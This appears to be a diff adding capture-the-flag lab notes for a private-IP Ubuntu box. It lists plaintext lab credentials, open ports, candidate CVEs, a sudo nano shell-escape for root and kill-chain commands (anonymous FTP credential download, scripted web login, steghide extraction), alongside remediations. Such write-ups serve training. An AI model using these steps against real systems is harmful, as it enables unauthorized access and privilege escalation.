@@ -1,0 +1,148 @@
+==============================================================================
+[OS]: Ubuntu 
+[IP]: 192.168.2.253
+[HOSTNAME]: wtf
+[BASIC-INFO]: N/A
+[USERS / EMAILS]:
+champ
+wtf
+n00b
+root
+[CREDENTIALS]:
+champ	:	password
+wtf	:	this one is a simple one
+n00b	:	aw3s0m3p@$$w0rd
+
+
+==============================================================================
+[NMAP-RESULTS]:
+21/tcp    open  ftp     vsftpd 3.0.3
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+55077/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+
+
+==============================================================================
+[TO-TRY]:
+1. gobuster sub dirs
+2. gobuster dirs
+3. anon login ftp				-	SUCCESSFUL
+4. search through http
+5. login to http using the found creds from FTP -	SUCCESSFUL
+6. try champ unde ssh
+7. try 'wtf' under ftp, http, and ssh		-	FTP SUCCESSFUL
+
+[CVE-LIST]:
+[port 21]
+CVE-2021-30047  7.5
+CVE-2021-3618   7.4
+
+[port 80]
+MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-    9.8
+EDB-ID:51193    9.8
+CVE-2024-38476  9.8
+CVE-2022-22720  9.8
+
+[port 55077]
+CVE-2023-38408  9.8
+CVE-2020-15778  7.8
+
+
+==============================================================================
+[WEB-TECHS]:
+PHP
+apache httpd 2.4.29
+
+[SUBDIR-ENUMS]: N/A
+[DIR-ENUMERATIONS]:
+/go.php               (Status: 200) [Size: 0]
+/index.php            (Status: 302) [Size: 0] [--> index.html]
+/logout.php           (Status: 302) [Size: 0] [--> index.html]
+/server-status        (Status: 403) [Size: 278]
+
+
+==============================================================================
+[PRIV-ESC]:
+# AS N00B THROUGH SSH
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+
+
+==============================================================================
+[TAKE-AWAYS]:
+flag.txt = VGhlIGZsYWXXXXXXXXXXXXXXXXXXXXW5nIGl0c2VsZg
+root.txt = 'Endorse me on linkedin => https://www.linkedin.com/in/deepak-aheer'
+
+
+==============================================================================
+[KILL CHAIN]:
+FTP ANONYMOUS ACCESS -> CVE-1999-0497
+Critical
+
+Account Found within FTPs anonymous access account under 
+
+[Compliance Gap]
+ISO/IEC 27001		- Failure to control network access
+NIST SP 800-53		- Failure to meet account management standards
+SOX (Potentially)	- If financial systems are involved
+[Policy Violations]	- N/A
+[Impact]		- Data Exposure | Unauthorized Access
+[Kill Chain]
+1. curl ftp://anonymous:anonymous@192.168.2.253/cred.txt
+
+[Remediations]
+1. [/etc/vsftpd.conf]
+>  anonymous_enable=NO
+
+
+
+Steganography found!
+Critical
+
+Account found within a steganographic image in http://192.168.2.253/downloads.rar
+
+[Compliance Gap]
+NIST SP 800-53 / 800-171- Requires FIPS-validated encryption for sensitive data at rest and in transit
+[Policy Violations]	- N/A
+[Impact]		- Data Exposure | Unauthorized access
+[Kill Chain]
+1. curl -c cookies.txt -d "username=champ&password=password" -X POST http://192.168.2.253/go.php && curl -b cookies.txt -O http://192.168.2.253/downloads.rar
+2. unrar e downloads.rar
+3. steghide extract -sf funny.bmp -p sudo
+4. cat user.txt
+5. rot13 user.txt
+
+[Remediation]
+Revise website links. [/about] shoud contain website or company information. Not a downloadable file with a hidden account.
+
+
+
+SSH password authentication
+Informational
+
+Accounts 'champ' and 'jgs' allow public key and password authentication
+
+[Compliance Gap]
+NIST SP 800-53		- Recommends multi-factor authentication and stronger access controls
+CIS Benchmarks		- Recommend disabling SSH password authentication
+[Impact]		- Potential bruteforcing avenue
+[Kill Chain]		- N/A
+[Remediation]
+1. [/etc/ssh/sshd_config]
+>  PasswordAuthentication NO
+
+
+
+FTP Overexposure of sensitive data
+High
+
+Account 'wtf' has the FTP server allows authenticated users to access the full contents of their associated home directories. This configuration exposes potentially sensitive files such as SSH keys, configuration files, saved credentials, etc.
+
+[Compliance Gap]
+NIST 800-53 / 800-171	- FTP does not encrypt traffic. Any access is subject to sniffing.
+[Impact]		- Exposing the full contents of wtf's home directory
+[Kill Chain]
+1. ftp wtf@192.168.2.253
+>  this one is a simple one
+[Remediation]
+Transition to SFTP for a secure connection.
